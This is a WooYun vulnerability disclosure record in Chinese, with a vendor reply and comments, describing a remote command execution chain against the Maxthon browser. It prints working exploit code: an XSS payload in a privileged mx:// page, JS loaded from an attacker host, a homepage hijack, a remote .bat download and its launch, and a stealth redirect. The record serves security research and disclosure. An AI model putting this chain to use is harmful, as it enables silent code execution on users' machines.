{"id": 47148, "wybug_id": "wooyun-2014-082043", "wybug_title": "傲游浏览器远程命令执行漏洞（浏览器设计缺陷）", "wybug_corp": "傲游", "wybug_author": "gainover", "wybug_date": "2014-11-05 11:23", "wybug_open_date": "2015-02-03 11:24", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向公众公开  简要描述： 上一个漏洞竟然给5分，良心呢！！女又心口扌立！当用户访问攻击者恶意构造的页面后，可以导致执行攻击者所指定的远程命令。 详细说明：  傲游浏览器在被前人提交了几次命令执行后，一些危险的API，比如File IO 和 maxthon.program.Program.launch 等已经做出了一定程度的限制。并且，由于之前一些漏洞的洗礼（ WooYun: 遨游浏览器命令执行漏洞 ），使得傲游浏览器对不同域之间的重定向，进行了限制，使得我们无法从http://跳转到一些特权域，比如mx://（会提示无法访问本地资源），这使得我们想在特权域下执行XSS来实现命令执行变得困难。--------------------------------------------------------------0x01 获得特权域XSS--------------------------------------------------------------1. 首先，我从MxWebkit.dll文件中搜索mx:// 得到一些有用的信息:\n\n2. 我选择了其中一个文件mx://res/notification/saved/index.htm ，进行查看：通过对代码进行简单的查看，不难发现dir参数进入了innerHTML，但限制了长度30\n\n3. 我们可以构造以下URL，弹窗测试(请自行测试)：\nmx://res/notification/saved/index.htm#a=1&dir=<svg onload%3dalert(1)>\n4. 由于 dir参数具有长度限制30，但这个长度已经足够我们调用外部JS文件了。利用“\\u2028”（此字符参见：http://drops.wooyun.org/papers/938），结合Function(URL)()来执行JS。代码如下：\nmx://res/notification/saved/index.htm#a=1&dir=<svg onload%3DFunction(URL)()>&【字符：\\u2028】var s=document.createElement(\"script\");s.src=\"http://192.168.0.115/mx/poc2.js\";document.body.appendChild(s);\n5. 值得我们注意的是，mx://res/notification/saved/index.htm 页面下，由于功能需要，允许使用maxthon.program.Program.launch这个API，这使得该页面下的XSS，可以执行指定路径的程序，如下图所示：\n\n调用maxthon.program.Program.launch弹出计算器：\nmaxthon.program.Program.launch(\"C:\\\\windows\\\\system32\\\\calc.exe\",\"\");\n\n\n--------------------------------------------------------------0x02 如何调用特权域XSS？--------------------------------------------------------------由于我们无法通过 location.href或是window.open等方式从 http域跳转至 mx域，这使得我们无法自动调用mx域下的XSS。\n\n我们怎么才能调用mx域下的页面呢？通过一番分析发现， maxthon.cn 域下的 maxthon 对象，允许访问 maxthon.browser.config来更改浏览器的一些用户设置。于是一个“猥琐”的方法诞生啦～～那就是将用户默认首页改为 mx://res/notification/saved/index.htm代码如下：\nmaxthon.browser.config.ConfigManager.set(\"maxthon.config\", \"browser.general.multihomepage\", '[\"mx://res/notification/saved/index.htm#a=1&url=1&dir=<svg onload%3DFunction(URL)()>&\\u2028var s=document.createElement(\\\\\\\"script\\\\\\\");s.src=\\\\\\\"http://192.168.0.115/mx/poc2.2.js\\\\\\\";document.body.appendChild(s);\"]')\n执行以上代码，可以发现，用户首页确实被修改：\n\n由于默认情况下，用户下次启动浏览器时，会自动打开主页：\n\n因此，在下次启动浏览器时，mx://res/notification/saved/index.htm将会被打开，并且执行我们的恶意代码，并通过maxthon.program.Program.launch来执行系统内的应用程序。--------------------------------------------------------------0x03 通过external.mxCall函数写入临时文件，达到任意命令执行--------------------------------------------------------------上一步，我们通过maxthon.program.Program.launch仅能实现调用系统自带的程序，比如calc.exe，要实现执行我们指定的命令，需要向用户本地写入文件。通过研究发现，傲游的external.mxCall函数会将远程文件，临时下载到临时目录下，且用户名为用户指定的文件名（即文件名非随机，可预测），以WIN7为例：\n//当我们执行   external.mxCall('InstallSkin',  \"http://192.168.0.115/mx/test.bat\");\n临时目录下会生成test.bat\n\n接着，我们要知道的是，临时目录的路径在哪里呢？傲游浏览器也为我们提供了相应的API：\nvar p=maxthon.system.Environment.getFolderPath('Mx3data');  //得到临时目录路径  var tmp=p+\"Temp\\\\\";\n* 值得说明的是 external.mxCall  只能在 *.maxthon.cn 域下执行，不能在 mx:// 下执行。--------------------------------------------------------------0x04 总结--------------------------------------------------------------A. 我们找到一个  *.maxthon.cn 下的XSS， 这里我就不找了，直接用上一个漏洞中my.maxthon.cn域下的FLASH XSS。\n<script>window.name='var s=document.createElement(\"script\");s.src=\"http://192.168.0.115/mx/poc2.1.js?\"+Math.random();document.body.appendChild(s);';location.href='http://my.maxthon.cn//public/images/swfupload.swf?preventswfcaching=1414769360525&movieName=aaa\"])}catch(e){if(!window.wy){window.wy=1;window.name%26%26eval(window.name);}};//';</script>\nB. 以上代码会调用 http://192.168.0.115/mx/poc2.1.js，该JS代码如下：\n(function(){\t//下载远程的test.bat到本地的Temp目录下\texternal.mxCall('InstallSkin',  \"http://192.168.0.115/mx/test.bat\");\t//将用户浏览器主页设置为 我们利用的mx://域下的地址\tmaxthon.browser.config.ConfigManager.set(\"maxthon.config\", \"browser.general.multihomepage\", '[\"mx://res/notification/saved/index.htm#a=1&url=1&dir=<svg onload%3DFunction(URL)()>&\\u2028var s=document.createElement(\\\\\\\"script\\\\\\\");s.src=\\\\\\\"http://192.168.0.115/mx/poc2.2.js\\\\\\\";document.body.appendChild(s);\"]')})();\n该JS主要执行两个功能，   一是下载一个test.bat到临时目录下，   二是将用户主页改为 mx://res/notification/saved/index.htm#.. XSS代码...C. 当用户下一次启动浏览器时，mx://res/notification/saved/index.htm#.. XSS代码... 将会被自动打开，XSS代码将会被自动执行，XSS代码将会调用http://192.168.0.115/mx/poc2.2.js，其代码内容如下：\n(function(){        //获得临时目录路径\tvar p=maxthon.system.Environment.getFolderPath('Mx3data');\tvar l=p+\"\\\\Temp\\\\\";        //执行步骤B中下载的test.bat\tmaxthon.program.Program.launch(l+\"test.bat\",\"\");})();\n此步骤中，临时目录下的test.bat将会被执行。--------------------------------------------------总体来说，就是下面这个图：\n\n具体效果见漏洞证明中的视频演示。   漏洞证明：  效果见视频演示（WIN7）： http://v.youku.com/v_show/id_XODE5MDEwOTQ0.html密码：wooyuncmdr视频演示中，test.bat的内容为  cmd /k ipconfig由于 mx:// 协议可以向 http:// 跳转，所以被修改的用户主页，可以在执行命令后，跳转为正常的用户主页，以实现一定的隐蔽性。   修复方案：  暂无   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-05 13:14 厂商回复： 请直接报xss漏洞即可。感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-05 11:26 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  猜猜这次几分    \n     2014-11-05 11:30 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  慢慢来 二哥 从5到20还有好多步呢 连载起来    \n     2014-11-05 11:35 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  上次的漏洞只给了二哥10分，遨游，你赶紧准备好接洞吧，二哥是不到20分就不善罢甘休的人啊    \n     2014-11-05 11:36 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  看错了，是5分    \n     2014-11-05 11:46 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  二哥又放大招了    \n     2014-11-05 11:58 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  我猜6分    \n     2014-11-05 11:58 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  已掌握二哥挖洞大法，准备闭关三个月研究后陪刷    \n     2014-11-05 12:45 |    \t\tVinGogh \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:7        | G.X.)\t\t \n  连载开始的节奏么    \n     2014-11-05 12:56 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  我猜最多给10分    \n     2014-11-05 12:57 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-11-05 13:06 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  @gainover 我表示已经看懂二哥隐藏含义：女又心口扌立！ 怒啦！！！    \n     2014-11-05 13:07 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  我赌8分    \n     2014-11-05 13:11 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  15    \n     2014-11-05 13:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  二货厂商    \n     2014-11-05 13:20 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @gainover 请直接报xss漏洞即可。感谢。哈哈，意思就是说，你不用搞啥其他的了，免得我们还要花时间去看~    \n     2014-11-05 13:39 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  转移战场了这是 威武    \n     2014-11-05 13:42 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  哈哈    \n     2014-11-05 14:31 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @xsser 曰二货厂商    \n     2014-11-05 14:33 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  又是精华...    \n     2014-11-05 15:40 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @老和尚 收藏关注等公开 看过之后肯定挖掘机技术倍增    \n     2014-11-05 15:58 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @abaddon    每次逛乌云，挖掘机技术都蹭蹭的往上飙    \n     2014-11-05 18:27 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @老和尚 挖掘机设计者 不是为了多挖坑 而是为了挖好坑最后少挖坑 哈哈]    \n     2014-11-06 11:58 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @gainover 看厂商的回复好像是xss  能否远程执行本地命令 直接shell    \n     2014-11-08 14:06 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @menmen519 我替厂商回答吧.不能    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}